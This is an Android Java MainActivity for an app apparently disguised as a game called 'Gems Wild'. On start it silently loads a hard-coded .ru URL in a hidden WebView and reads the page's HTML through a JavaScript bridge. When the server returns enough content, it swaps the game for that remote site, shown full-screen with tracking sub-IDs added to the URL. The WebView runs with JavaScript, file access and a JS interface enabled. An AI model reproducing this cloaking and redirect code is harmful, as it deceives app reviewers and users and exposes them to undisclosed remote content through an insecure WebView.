package com.gems.wild;

import androidx.annotation.RequiresApi;
import androidx.appcompat.app.AppCompatActivity;
import androidx.fragment.app.FragmentTransaction;

import android.content.ActivityNotFoundException;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ActivityInfo;
import android.graphics.drawable.AnimationDrawable;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.webkit.CookieSyncManager;
import android.webkit.ValueCallback;
import android.webkit.WebChromeClient;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.FrameLayout;
import android.widget.ImageView;
import android.widget.Toast;

import com.facebook.FacebookSdk;
import com.onesignal.OneSignal;

public class MainActivity extends AppCompatActivity {

    private static final String ONESIGNAL_APP_ID = "4c39abdc-21c2-4555-91bc-5851cf370837";
    private final static int FILECHOOSER_RESULTCODE = 1;
    public static final int REQUEST_SELECT_FILE = 100;
    private ValueCallback<Uri> mUploadMessage;
    public ValueCallback<Uri[]> uploadMessage;
    private WebView web;
    private String mUrl = "http://brachigvoc.ru/Jq13fr9H";
    private static MainActivity instance;
    private boolean check = false;
    private ImageView loading;
    private FrameLayout animGemsWildContainer;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        navigationBarOff();

        loading = findViewById(R.id.load_anim);
        loading.setBackgroundResource(R.drawable.animation_of_loading);
        AnimationDrawable animation = (AnimationDrawable) loading.getBackground();
        animation.start();

        animGemsWildContainer = findViewById(R.id.anim_gems_wild_container);
        web = findViewById(R.id.test_web);

        setConfigWebView();
        instance = this;

        OneSignal.setLogLevel(OneSignal.LOG_LEVEL.VERBOSE, OneSignal.LOG_LEVEL.NONE);
        OneSignal.initWithContext(this);
        OneSignal.setAppId(ONESIGNAL_APP_ID);

        FacebookSdk.sdkInitialize(getApplicationContext());
        FacebookSdk.setAutoInitEnabled(true);
        FacebookSdk.fullyInitialize();

        isInetConect();
    }

    @Override
    public void onBackPressed() {
        if (check && web.canGoBack()) {
            web.goBack();
        }
        else if (getSupportFragmentManager().findFragmentByTag("infotag") != null && !check) {
            loading.setVisibility(View.GONE);
            web.setVisibility(View.GONE);
            setRequestedOrientation(ActivityInfo.SCREEN_ORIENTATION_LANDSCAPE);
            FragmentTransaction fTransaction = getSupportFragmentManager().beginTransaction();
            fTransaction.replace(R.id.anim_gems_wild_container, new GemsFragment(),"gemstag");
            fTransaction.commit();
            animGemsWildContainer.setVisibility(View.VISIBLE);
        }
        else{
            super.onBackPressed();
        }
    }

    public static MainActivity getInstance() {
        return instance;
    }

    private void setConfigWebView() {
        WebSettings wSet = web.getSettings();
        wSet.setJavaScriptEnabled(true);
        wSet.setSupportZoom(false);
        wSet.setAllowFileAccess(true);
        wSet.setAllowContentAccess(true);

        web.setWebViewClient(new WebViewClient());
        web.setWebChromeClient(new WebChromeClient());

        CookieSyncManager.createInstance(web.getContext());
        CookieSyncManager.getInstance().sync();

        web.getSettings().setJavaScriptEnabled(true);
        web.getSettings().setDomStorageEnabled(true);
        web.requestFocus(View.FOCUS_DOWN);

        web.setWebChromeClient(new WebChromeClient()
        {
            // For 3.0+ Devices (Start)
            // onActivityResult attached before constructor
            protected void openFileChooser(ValueCallback uploadMsg, String acceptType)
            {
                mUploadMessage = uploadMsg;
                Intent i = new Intent(Intent.ACTION_GET_CONTENT);
                i.addCategory(Intent.CATEGORY_OPENABLE);
                i.setType("image/*");
                startActivityForResult(Intent.createChooser(i, "File Browser"), FILECHOOSER_RESULTCODE);
            }

            // For Lollipop 5.0+ Devices
            @RequiresApi(api = Build.VERSION_CODES.LOLLIPOP)
            public boolean onShowFileChooser(WebView mWebView, ValueCallback<Uri[]> filePathCallback, WebChromeClient.FileChooserParams fileChooserParams)
            {
                if (uploadMessage != null) {
                    uploadMessage.onReceiveValue(null);
                    uploadMessage = null;
                }

                uploadMessage = filePathCallback;

                Intent intent = fileChooserParams.createIntent();
                try
                {
                    startActivityForResult(intent, REQUEST_SELECT_FILE);
                } catch (ActivityNotFoundException e)
                {
                    uploadMessage = null;
                    Toast.makeText(getApplicationContext(), "Cannot Open File Chooser", Toast.LENGTH_LONG).show();
                    return false;
                }
                return true;
            }

            //For Android 4.1 only
            protected void openFileChooser(ValueCallback<Uri> uploadMsg, String acceptType, String capture)
            {
                mUploadMessage = uploadMsg;
                Intent intent = new Intent(Intent.ACTION_GET_CONTENT);
                intent.addCategory(Intent.CATEGORY_OPENABLE);
                intent.setType("image/*");
                startActivityForResult(Intent.createChooser(intent, "File Browser"), FILECHOOSER_RESULTCODE);
            }

            protected void openFileChooser(ValueCallback<Uri> uploadMsg)
            {
                mUploadMessage = uploadMsg;
                Intent i = new Intent(Intent.ACTION_GET_CONTENT);
                i.addCategory(Intent.CATEGORY_OPENABLE);
                i.setType("image/*");
                startActivityForResult(Intent.createChooser(i, "File Chooser"), FILECHOOSER_RESULTCODE);
            }
        });
    }

    @Override
    public void onActivityResult(int requestCode, int resultCode, Intent intent) {
        super.onActivityResult(requestCode, resultCode, intent);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            if (requestCode == REQUEST_SELECT_FILE) {
                if (uploadMessage == null)
                    return;
                uploadMessage.onReceiveValue(WebChromeClient.FileChooserParams.parseResult(resultCode, intent));
                uploadMessage = null;
            }
        } else if (requestCode == FILECHOOSER_RESULTCODE) {
            if (null == mUploadMessage)
                return;
            // Use MainActivity.RESULT_OK if you're implementing WebView inside Fragment
            // Use RESULT_OK only if you're implementing WebView inside an Activity
            Uri result = intent == null || resultCode != RESULT_OK ? null : intent.getData();
            mUploadMessage.onReceiveValue(result);
            mUploadMessage = null;
        } else
            Toast.makeText(getApplicationContext(), "Failed to Upload Image", Toast.LENGTH_LONG).show();
    }

    private void navigationBarOff(){
        View dec = getWindow().getDecorView();
        dec.setSystemUiVisibility(
                View.SYSTEM_UI_FLAG_LAYOUT_STABLE
                        | View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION
                        | View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN
                        | View.SYSTEM_UI_FLAG_HIDE_NAVIGATION
                        | View.SYSTEM_UI_FLAG_FULLSCREEN
                        | View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY);
    }

    @Override
    public void onWindowFocusChanged(boolean hasFocus) {
        super.onWindowFocusChanged(hasFocus);
        navigationBarOff();
    }

    private void isInetConect() {
        ConnectivityManager con = (ConnectivityManager)getSystemService(Context.CONNECTIVITY_SERVICE);
        if(con.getNetworkInfo(ConnectivityManager.TYPE_MOBILE).getState() == NetworkInfo.State.CONNECTED ||
                con.getNetworkInfo(ConnectivityManager.TYPE_WIFI).getState() == NetworkInfo.State.CONNECTED) {
            getWildHtml();
        }
        else{
            ShowGemsFrag();
        }
    }

    private void getWildHtml() {
        WebSettings ws = web.getSettings();
        ws.setJavaScriptEnabled(true);
        web.addJavascriptInterface(new JSInterface(), "HTMLOUT");

        web.setWebViewClient(new WebViewClient() {
            @Override
            public void onPageFinished(WebView view, String url) {
                web.loadUrl("javascript:HTMLOUT.processHTML(document.documentElement.outerHTML);");
            }
        });

        web.loadUrl(mUrl);
        web.setVisibility(View.GONE);
    }

    private void ShowGemsFrag() {
        loading.setVisibility(View.GONE);
        setRequestedOrientation(ActivityInfo.SCREEN_ORIENTATION_LANDSCAPE);
        FragmentTransaction fTran = getSupportFragmentManager().beginTransaction();
        fTran.add(R.id.anim_gems_wild_container, new GemsFragment(),"gemstag");
        fTran.commit();
        animGemsWildContainer.setVisibility(View.VISIBLE);
    }

    public void startWild(){
        String checkString = "";

        try {
            checkString = JSInterface.wilder.getWP();
        } catch (Exception ex) {
        }

        if (checkString.length() > 80) {
            check = true;

            if (!JSInterface.wilder.getUriPart().equals("")) {
                mUrl += "?subId1=GEMS&subId2=GEMS&subId3=GEMS&subId4=GEMS&subId5=GEMS";
                String pcs[] = JSInterface.wilder.getUriPart().split("//");

                for (int i = 0; i < pcs.length; i++) {
                    mUrl = mUrl.replaceFirst("GEMS", pcs[i]);
                }
                mUrl = mUrl.replaceAll("GEMS", "");
            }
            Log.d("end url", mUrl);

            animGemsWildContainer.setVisibility(View.GONE);
            web.setVisibility(View.VISIBLE);

        }
        else {
            web.setVisibility(View.GONE);
            setRequestedOrientation(ActivityInfo.SCREEN_ORIENTATION_LANDSCAPE);
            FragmentTransaction ft = getSupportFragmentManager().beginTransaction();
            ft.add(R.id.anim_gems_wild_container, new GemsFragment(),"gemstag");
            ft.commit();
            animGemsWildContainer.setVisibility(View.VISIBLE);
        }
    }

}